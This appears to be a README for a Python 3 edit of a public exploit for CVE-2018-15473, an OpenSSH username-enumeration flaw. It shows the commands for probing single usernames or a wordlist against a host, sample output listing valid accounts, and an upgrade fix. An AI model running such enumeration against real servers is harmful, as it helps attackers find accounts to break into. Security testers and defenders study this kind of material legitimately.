## CVE-2018-15473


**SSH-Username-Enumeration-Exploit (OpenSSH 2.3 < 7.7)**

Edited version of the original exploit: [https://www.exploit-db.com/exploits/45233](https://www.exploit-db.com/exploits/45233)

- Converted to Python3
- Added username wordlist option

## How To Run


```shell
#Ensure that you install the requirements:
foo@bar:~$ pip3 install -r requirements.txt
```

```shell
#For single username:
foo@bar:~$ ./openssh77.py 0.0.0.0 -u root
[+] root is a valid username
```

```shell
#For multiple username:
foo@bar:~$ ./openssh77.py 0.0.0.0 -w username_wordlist.txt
[+] root is a valid username
[-] mysql is an invalid username
[-] mike is an invalid username
[-] foo is an invalid username
[-] bar is an invalid username
Valid Users: 
root
```

```shell
#For more option:
foo@bar:~$ ./openssh77.py -h
```

## About the Vulnerability:


The system responds differently to valid and invalid authentication attempts. A remote user can send specially crafted requests to determine valid usernames on the target system. Thus, a remote user can determine valid usernames on the target system.

## Solution:


OpenSSH server should be upgraded to, or higher than, version 7.7
